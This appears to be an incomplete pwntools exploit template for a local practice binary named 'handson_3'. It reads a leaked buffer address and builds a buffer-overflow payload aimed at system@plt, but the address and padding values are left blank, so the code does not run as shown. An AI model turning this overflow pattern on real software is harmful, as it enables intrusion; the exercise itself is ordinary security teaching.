from pwn import *

target = process("./handson_3")

# address
system_plt = 

_ = target.readuntil("buf1 = ") 
buf1_addr = int(target.readline(), 16)

print("buf addr : 0x{:x}".format(buf1_addr))

_ = target.readline()

# payload
payload = b"A" * 
payload += 

target.sendline(payload)

target.interactive()
